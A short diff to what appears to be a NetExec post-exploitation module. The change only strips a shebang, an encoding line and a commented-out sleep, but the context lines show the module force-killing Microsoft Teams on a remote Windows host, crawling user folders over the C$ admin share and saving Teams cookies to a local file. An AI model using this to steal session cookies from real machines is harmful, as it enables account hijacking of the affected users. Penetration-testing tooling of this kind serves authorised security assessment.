@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import sqlite3
 
 
@@ -17,7 +14,6 @@ class NXCModule:
     def on_admin_login(self, context, connection):
         context.log.display("Killing all Teams process to open the cookie file")
         connection.execute("taskkill /F /T /IM teams.exe")
-        # sleep(3)
         found = 0
         paths = connection.spider("C$", folder="Users", regex=["[a-zA-Z0-9]*"], depth=0)
         with open("/tmp/teams_cookies2.txt", "wb") as f:
